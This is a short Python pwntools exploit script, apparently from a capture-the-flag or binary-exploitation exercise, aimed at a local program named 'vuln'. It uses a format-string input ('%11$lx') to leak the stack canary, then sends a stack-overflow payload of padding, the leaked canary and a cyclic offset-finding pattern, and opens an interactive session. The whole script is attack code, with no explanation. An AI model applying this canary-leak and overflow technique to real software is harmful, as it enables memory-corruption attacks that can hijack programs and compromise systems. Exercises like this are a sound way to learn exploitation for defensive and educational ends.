#!/usr/bin/env python
from pwn import *
 
e = ELF('vuln')
io = e.process()
# context.terminal = ['tmux', 'splitw', '-h']
gdb.attach(io)
 
io.sendline('%11$lx')
io.recvline()
leak = io.recvline()
canary = int(leak.strip(), 16)
log.info("Canary: %s" % (hex(canary)))
 
payload = flat(b"A"*24, canary, b"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH",
               endianness = 'little', word_size = 64, sign = False)
 
io.sendline(payload)
io.interactive()